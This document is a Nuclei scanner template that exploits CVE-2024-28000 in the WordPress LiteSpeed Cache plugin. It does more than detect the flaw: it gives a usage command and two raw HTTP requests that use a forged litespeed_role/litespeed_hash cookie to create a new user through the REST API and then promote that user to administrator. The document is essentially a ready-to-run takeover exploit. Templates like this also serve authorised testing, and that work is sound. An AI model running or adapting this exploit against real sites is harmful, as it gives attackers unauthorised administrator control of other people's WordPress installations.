id: CVE-2024-28000

info:
  name: WordPress LiteSpeed Cache - Unauthenticated Privilege Escalation to Admin
  author: melmathari
  severity: critical
  description: |
    Exploits CVE-2024-28000 in LiteSpeed Cache.
    Uses provided litespeed_hash to simulate admin and create a new Administrator user.
    Usage: nuclei -t CVE-2024-28000.yaml -u target -var litespeed_hash=HASH
  reference:
    - https://patchstack.com/articles/critical-privilege-escalation-in-litespeed-cache-plugin-affecting-5-million-sites?_s_id=cve
    - https://vulncheck.com/xdb/6f169f41e032
    - https://github.com/JohnDoeAnonITA/CVE-2024-28000
    - https://github.com/advisories/GHSA-3cp9-7899-h8r7
    - https://vulncheck.com/xdb/59b6100ba6ef
    - https://github.com/SSSSuperX/CVE-2024-28000
    - https://vulncheck.com/xdb/ab75c9e64c82
    - https://github.com/arch1m3d/CVE-2024-28000
    - https://github.com/ebrasha/CVE-2024-28000
    - https://vulncheck.com/xdb/386df3d14c76
    - https://github.com/Alucard0x1/CVE-2024-28000
  tags: cve,wordpress,litespeed,wp-plugin,priv-esc

requests:
  - raw:
      - |
        POST /wp-json/wp/v2/users HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Cookie: litespeed_role=1; litespeed_hash={{litespeed_hash}}

        {
          "username": "nuclei-{{randstr}}",
          "password": "Nuclei!2025",
          "email": "nuclei-{{randstr}}@example.com"
        }

    extractors:
      - type: json
        name: user_id
        internal: true
        json:
          - ".id"

    matchers:
      - type: status
        status:
          - 201

  - raw:
      - |
        PUT /wp-json/wp/v2/users/{{user_id}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Cookie: litespeed_role=1; litespeed_hash={{litespeed_hash}}

        {
          "roles": ["administrator"]
        }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"administrator"'
